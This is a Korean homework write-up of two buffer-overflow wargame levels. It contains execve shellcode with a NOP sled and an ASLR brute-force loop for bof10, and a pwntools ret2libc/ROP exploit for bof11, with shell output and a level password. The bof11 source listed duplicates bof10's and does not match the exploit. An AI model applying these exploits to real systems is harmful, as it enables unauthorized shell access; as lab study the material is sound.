# Report. HW9.

## `bof10` (복습 차원)

<details><summary>bof10.c</summary>
<p>
    
```c
// AFTER => bof9.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#define BUF_SIZE 8

// ASLR ON
// STACK-PROTECTOR OFF
// STACK-EXECUTION ON

void vuln(char * arg) {
    char buf[BUF_SIZE];

    if (setreuid(1011, 1011)) {
        perror("setuid");
        exit(1);
    }
    if (setregid(1011, 1011)) {
        perror("setgid");
        exit(1);
    }
    strcpy(buf, arg);
    printf("Hello %s[%p]!\n", buf, buf);
    printf("(env:SHELLCODE -> %p)\n", getenv("SHELLCODE"));
}

int main(int argc, char *argv[]) {
    vuln(argv[1]);
    return 0;
}

```
</p></details>

ASLR이 켜져 있지만 NX bit가 켜져 있으니, 스택에 쉘코드가 있다면 그게 있는 주소로 넘어가게끔 `RET`를 조작하여 실행할 수 있을 것이다. 참고해야 할 건... 버퍼의 크기가 8이고 실행되는 환경이 32비트 환경이란 것. ~~제대로 된 설명이 필요하지만 디버깅을 하면 `buf`와 `RET`와의 거리가 20이라는 것을 확인할 수 있었다~~

쉘코드는... `"/bin/sh"`를 실행하는 걸 인터넷에서 찾아서 쓰면 된다. 그리고 쉘코드를 가리키는 주소를 찾아서 넣어주면 되는데, 문제는... ASLR 때문에 *매번 실행할 때 마다 `SHELLCODE`의 주소값이 자꾸 바뀐다는 것*이다. 매니저님은 여기서 **NOP Sled**를 이용하라고 했었다.


### `NOP`(`'\x90'`), 그리고 NOP Sled

`No OPeration`. **"아무 일도 하지 않는다."** 어떤 주소에 이 `NOP` 명령어가 있다면 아무것도 하지 않고 다음 명령어로 넘어간다. NOP Sled는 이런 `NOP` 명령어를 일렬로 무진장 넣어서, `NOP` 명령어가 있는 주소들 중 한 곳을 가리켜 이걸 싫행할 경우 그 아래에 있는 `NOP` 명령어들을 넘고 넘고 넘고 넘고 넘어서 내가 원하는 - 이번 `bof10`에선 `/bin/sh`을 실행하는 쉘코드 - 명령어의 주소에 도달하여 이것을 실행할 수 있게 하는 기법을 말한다. 마치 `NOP`로 된 썰매를 탄다는 느낌이다.

쉘코드 앞에 이런 NOP Sled를 추가해야 하는데, Sled의 길이가 길면 길수록 쉘코드를 실행할 확률이 높아진다. 엄청 좁은 곳에 돌을 던져 넣으려 하는데 좁은 곳에다가 넓적한 깔때기를 끼워넣는 느낌이라고 해야 하나~~...를 수업 시간에 말하려 했다가 비유 들지 말라고 혼났었다~~.

무한히 넣을 수 있으면 좋겠지만 그건 불가능하다. 한번 20만개의 `NOP`를 넣어봤는데,

    bash: ./bof10: Argument list too long
    
...이라는 오류 메세지를 출력한다. 그래서 쉘코드 앞에 10만개의 `NOP`를 넣는 방향으로 수정하였다. 그렇게 쉘코드를...

    export SHELLCODE=$(python -c "print('\x90' * 100000 + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80')")
    
로 만들어 등록하였다. 그런데... 한번 실행해선 걸릴 리가 거의 없잖아.

반복적으로 실행하다 보면 쉘코드 주소가 특정 범위 내에 있다는 것을 확인할 수 있다.

    (env:SHELLCODE -> 0xffbf6190)
    Segmentation fault (core dumped)
    Hello xxxxxxxxxxxxxxxxxxxx[0xff88ba08]!
    (env:SHELLCODE -> 0xff88d190)
    Segmentation fault (core dumped)
    Hello xxxxxxxxxxxxxxxxxxxx[0xffb46e58]!
    (env:SHELLCODE -> 0xffb47190)
    Segmentation fault (core dumped)
    Hello xxxxxxxxxxxxxxxxxxxx[0xff8b79c8]!
    (env:SHELLCODE -> 0xff8b9190)
    Segmentation fault (core dumped)
    Hello xxxxxxxxxxxxxxxxxxxx[0xffd0a908]!
    (env:SHELLCODE -> 0xffd0b190)
    Segmentation fault (core dumped)
    Hello xxxxxxxxxxxxxxxxxxxx[0xffa1f448]!
    (env:SHELLCODE -> 0xffa20190)
    Segmentation fault (core dumped)
    Hello xxxxxxxxxxxxxxxxxxxx[0xff9b96e8]!
    (env:SHELLCODE -> 0xff9ba190)
    Segmentation fault (core dumped)
    Hello xxxxxxxxxxxxxxxxxxxx[0xffdb7f88]!
    (env:SHELLCODE -> 0xffdb9190)
    Segmentation fault (core dumped)
    Hello xxxxxxxxxxxxxxxxxxxx[0xffa7dc58]!
    (env:SHELLCODE -> 0xffa7e190)
    Segmentation fault (core dumped)
    Hello xxxxxxxxxxxxxxxxxxxx[0xfff94538]!

위는 반복문 안에 명령어를 넣어서 실행한 거긴 한데... 보면 `SHELLCODE` 환경변수의 주소가 `0xff***190`으로 나온다. 중간 3자리는 매번 바뀌지만 나머지 5자리는 계속 같은 게 나온다.

반복문 안에 명령어로 

    while true ; do ./bof10 $(python -c "print('x' * 20 + '\x90\xff\x7f\xff')"); done
    
를 주면 언젠가 한번은 걸릴 것이다(중간 3자리를 `7ff`로 고정, 주소값을 `0xff7fff90`을 예시로 주었다). 그 결과... 잠깐 시간이 지나고

    Hello xxxxxxxxxxxxxxxxxxxx[0xff7fa308]!
    (env:SHELLCODE -> 0xff7fc190)
    $ id
    uid=1011(bof11) gid=1011(bof11) groups=1011(bof11),1010(bof10)
    $ ls
    a.out  bof10  bof10.c  bof10.hint  bof11.pw  shellcode  test.c
    $ cat bof11.pw
    ********
    $ exit

성공하였다.

---

## `bof11`

<details><summary>bof11.c</summary>
<p>
    
```c
// AFTER => bof9.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#define BUF_SIZE 8

// ASLR ON
// STACK-PROTECTOR OFF
// STACK-EXECUTION ON

void vuln(char * arg) {
    char buf[BUF_SIZE];

    if (setreuid(1011, 1011)) {
        perror("setuid");
        exit(1);
    }
    if (setregid(1011, 1011)) {
        perror("setgid");
        exit(1);
    }
    strcpy(buf, arg);
    printf("Hello %s[%p]!\n", buf, buf);
    printf("(env:SHELLCODE -> %p)\n", getenv("SHELLCODE"));
}

int main(int argc, char *argv[]) {
    vuln(argv[1]);
    return 0;
}

```
</p></details>

ASLR이 켜져 있다. NX bit는 꺼져있다. 스택에서의 실행이 불가능하다. 일단 RTL을 쓰고 싶은데, ASLR 때문에 정확한 주소값을 알 수가 없다(메모리의 주소값이 매 실행마다 바뀌어서 정확한 것을 찾을 수 없음). 하지만, **어떤 요소 - 여기서는 `glibc`를 기준으로 잡았다 - 를 기준으로 다른 요소들이 위치해 있는 주소값과의 상대적인 거리는 일정함**을 이용할 수 있다고 했었다. 그러니까, ~~`glibc`를 기준으로 필요로 하는 요소들 `"pop rdi ; ret"`, `"/bin/sh"`, `system`의 상대적인 위치를 구한 후,  이걸 `RET` 부분부터 덮어씌우면 될...~~ 어떻게 시작을 해야 할까.

### 각 요소들의 offset

`gdb`로 `bof11`을 디버깅하는 상황에서 필요한 요소들의 주소값을 조사해 보았다(여러번의 실행에 걸쳐서 돌리게 되면 ASLR에 의해 매번 glibc와 기타 요소들의 주소들이 달라지기 때문에 한번의 `bof11` 실행에서 각각의 주소값들을 확인하여야 한다.)

조사한 결과...

    glibc(of one bof11)   @ 0x00007faaa2c65000.
    printf(of one bof11)  @ 0x00007faaa2cba800.
    /bin/sh(of one bof11) @ 0x00007faaa2df1d57.

가 나왔다.

`bof11`을 실행하면 `printf`의 주소를 출력해준다. 그런데... `gef` 속 `search-pattern`을 통해 `printf`를 찾아보니... 

    [+] Searching 'printf' in memory
    [+] In '/home/bof11/bof11'(0x55f5e120e000-0x55f5e120f000), permission=r--
      0x55f5e120e54d - 0x55f5e120e553  →   "printf"
    [+] In '/home/bof11/bof11'(0x55f5e1210000-0x55f5e1211000), permission=r--
      0x55f5e1210004 - 0x55f5e121001b  →   "printf() address : %p\n"
    [+] In '/home/bof11/bof11'(0x55f5e1211000-0x55f5e1212000), permission=r--
      0x55f5e1211004 - 0x55f5e121101b  →   "printf() address : %p\n"
    [+] In '/tmp/2.23/lib/libc.so.6'(0x7f237f81f000-0x7f237f9df000), permission=r-x
      0x7f237f830043 - 0x7f237f830049  →   "printf"
      0x7f237f8304ba - 0x7f237f8304c0  →   "printf"
      0x7f237f8304ca - 0x7f237f8304d9  →   "printf_function"
      0x7f237f830624 - 0x7f237f83062e  →   "printf_chk"
      0x7f237f830dfd - 0x7f237f830e07  →   "printf_chk"
      0x7f237f831239 - 0x7f237f831243  →   "printf_chk"
      0x7f237f83139e - 0x7f237f8313a4  →   "printf"
      0x7f237f8317a4 - 0x7f237f8317af  →   "printf_type"
      0x7f237f83180f - 0x7f237f83181a  →   "printf_size"
      0x7f237f8319a8 - 0x7f237f8319ae  →   "printf"
      0x7f237f831b7b - 0x7f237f831b85  →   "printf_chk"
      0x7f237f831ce2 - 0x7f237f831ce8  →   "printf"
      0x7f237f831e6a - 0x7f237f831e74  →   "printf_chk"
      0x7f237f831f2c - 0x7f237f831f3b  →   "printf_modifier"
      0x7f237f832334 - 0x7f237f83233e  →   "printf_chk"
      0x7f237f8327dc - 0x7f237f8327e2  →   "printf"
      0x7f237f832f34 - 0x7f237f832f3e  →   "printf_chk"
      0x7f237f83313d - 0x7f237f833147  →   "printf_chk"
      0x7f237f833735 - 0x7f237f83373f  →   "printf_chk"
      0x7f237f8339ab - 0x7f237f8339b5  →   "printf_chk"
      0x7f237f833a3c - 0x7f237f833a46  →   "printf_chk"
      0x7f237f833d27 - 0x7f237f833d2d  →   "printf"
      0x7f237f833d65 - 0x7f237f833d75  →   "printf_specifier"
      0x7f237f833e11 - 0x7f237f833e1e  →   "printf_format"
      0x7f237f833eb3 - 0x7f237f833ebd  →   "printf_chk"
      0x7f237f833f48 - 0x7f237f833f52  →   "printf_chk"
      0x7f237f8341c1 - 0x7f237f8341ca  →   "printf_fp"
      0x7f237f834259 - 0x7f237f834263  →   "printf_chk"
      0x7f237f83440f - 0x7f237f83441f  →   "printf_size_info"
      0x7f237f83450d - 0x7f237f834513  →   "printf"
      0x7f237f834607 - 0x7f237f834611  →   "printf_chk"
      0x7f237f83481d - 0x7f237f834827  →   "printf_chk"
      0x7f237f83487e - 0x7f237f834888  →   "printf_chk"
      0x7f237f8348ab - 0x7f237f8348b5  →   "printf_chk"
      0x7f237f834a53 - 0x7f237f834a5d  →   "printf_chk"
      0x7f237f834bef - 0x7f237f834bf5  →   "printf"
      0x7f237f834c6c - 0x7f237f834c72  →   "printf"
      0x7f237f834d56 - 0x7f237f834d5c  →   "printf"
      0x7f237f834ef5 - 0x7f237f834efb  →   "printf"
      0x7f237f8352ea - 0x7f237f8352f4  →   "printf_chk"
      0x7f237f8356bf - 0x7f237f8356c5  →   "printf"
      0x7f237f9abdde - 0x7f237f9abde6  →   "printf.c"
      0x7f237f9aca90 - 0x7f237f9aca98  →   "printf.c"
      0x7f237f9acb24 - 0x7f237f9acb2c  →   "printf.c"
      0x7f237f9ae44b - 0x7f237f9ae457  →   "printf_chk.c"
      0x7f237f9af7c0 - 0x7f237f9af7ce  →   "printf_fphex.c"
      0x7f237f9af7fa - 0x7f237f9af806  →   "printf_fphex"
      0x7f237f9af80f - 0x7f237f9af815  →   "printf"
      0x7f237f9afd6c - 0x7f237f9afd72  →   "printf"
      0x7f237f9b2820 - 0x7f237f9b2831  →   "printf_positional"
      0x7f237f9b2846 - 0x7f237f9b2855  →   "printf_internal"
      0x7f237f9b28bd - 0x7f237f9b28c3  →   "printf"
      0x7f237f9b2b8b - 0x7f237f9b2b95  →   "printf_chk"
    [+] In '/tmp/2.23/lib/ld-linux-x86-64.so.2'(0x7f237fbe9000-0x7f237fc0f000), permission=r-x
      0x7f237fc0b62c - 0x7f237fc0b632  →   "printf"

결과값도 (다른 것들도 나오지만) `printf`만 해도 너무 많이 나온다. 그러니까, `bof11`에서 출력하는 `printf`가 저 중 어떤 것인지 알 수가 없다. 그래서... 이전 `bof9`에서 찾았던 `system`을 참고하여, **`system`을 기준으로 다른 요소들의 상대값을 찾기로 하였다.**

    glibc(of bof9) @ 0x00007ffff7a0d000
    system(of bof9) @ 0x00007ffff7a52390
    
...가 찾은 결과물이었다.

    "pop rdi ; ret" @ 0x0000000000021102.
    
...는 `glibc` 중 `"pop rdi ; ret"` 가젯이 위치해 있는 offset이다(`ROPgadget.py`를 통해 찾을 수 있었는데 이미 offset 값으로 나와 있다).

추가...로, 디버깅을 통해 `RET`와 `buf` 사이의 거리가 **`18`**이란 걸 확인할 수 있었다. 이걸 바탕으로 목요일 수업 시간에 만들었던 payload exploit 파일 뼈대를 다듬었다.


<details><summary>exp_bof11.py.base</summary>
<p>

```python
from pwn import *

p = process('./bof11')

p.recvuntil('printf() address : ')
printf_addr = p.recvuntil('\n')

system_addr = printf_addr # + system offset here
binsh_addr = printf_addr # + binsh offset here
poprdi_ret = printf_addr # + binsh offset here

payload = 'x' * 20
payload += p64(poprdi_ret)
payload += p64(binsh_addr)
payload += p64(system_addr)

p.send(payload)
p.interactive()

```
</p></details>

를,

<details><summary>exp_bof11.py</summary>
<p>

```python
from pwn import *

p = process('./bof11')

p.recvuntil('printf() address : ')
printf_addr = int(p.recvuntil('\n').decode('UTF-8').strip(), 16)

glibc_offset = {}
glibc_offset['poprdi'] = 0x0000000000021102
glibc_offset['printf'] = -(0x00007faaa2c65000 - 0x00007faaa2cba800)
glibc_offset['binsh']  = -(0x00007faaa2c65000 - 0x00007faaa2df1d57)
glibc_offset['system'] = -(0x00007ffff7a0d000 - 0x00007ffff7a52390)

glibc_addr = printf_addr - glibc_offset['printf']
system_addr = glibc_addr + glibc_offset['system']
binsh_addr  = glibc_addr + glibc_offset['binsh']
poprdi_ret  = glibc_addr + glibc_offset['poprdi']

print(hex(glibc_addr))
print(hex(printf_addr))
print(hex(poprdi_ret))
print(hex(binsh_addr))
print(hex(system_addr))

payload = ('x' * 18).encode()
payload += p64(poprdi_ret)
payload += p64(binsh_addr)
payload += p64(system_addr)

p.send(payload)
p.interactive()

```
</p></details>

...로 바꾸었다. 뼈대를 기준으로 바뀐 부분은...

- 각 명령어들의 `glibc`로부터의 offset을 계산해서 구할 수도 있었겠지만 그러기엔 귀찮아서 코드 안에서 처리하기로 했다.
- `printf_addr`를 구하긴 하지만 이것을 기준으로 하지 않고 `glibc_addr`를 기준으로 매 실행마다 각 요소들의 주소를 구하는 방향으로 수정하였다.
- 뼈대에선 `printf_addr`에 주소가 들어간 `string`이 들어가지만 여기선 바로 16진수 `int`형 값으로 변환하여 씌우는 방향으로 수정하였다.

그렇게 만든 `exp_bof11.py`를 `python3`로 돌려보았는데 - pwn 모듈이 python2에선 돌아가지 않았다 - 성공적으로 먹혀들었다.

    bof11@9abd2f7e3e2b:~$ python3 exp_bof11.py
    [+] Starting local process './bof11': pid 1305
    0x7f9f9e431000
    0x7f9f9e486800
    0x7f9f9e452102
    0x7f9f9e5bdd57
    0x7f9f9e476390
    [*] Switching to interactive mode
    $
    Hello xxxxxxxxxxxxxxxxxx!E\x9e\x9f\x7f
    $ id
    uid=1012(bof12) gid=1012(bof12) groups=1012(bof12),1011(bof11)
    $ ls
    a.out  bof11.c       bof12.pw     exp_bof11.py.base  libc.so.6
    bof11  bof11.hint  exp_bof11.py  exp_bof11.py.hint  which_system.c
    $ cat bof12.pw
    bbcd6e39
    $ exit
    [*] Got EOF while reading in interactive
    $ exit
    [*] Process './bof11' stopped with exit code -11 (SIGSEGV) (pid 1305)
    [*] Got EOF while sending in interactive
    bof11@9abd2f7e3e2b:~$ su bof12
    Password:
     Congratulations!
     You solved all BOF CTFs.
    Press [Enter] to exit...

`bof12` 계정이 있긴 하였으나 여기가 끝이었다.


# -- END --

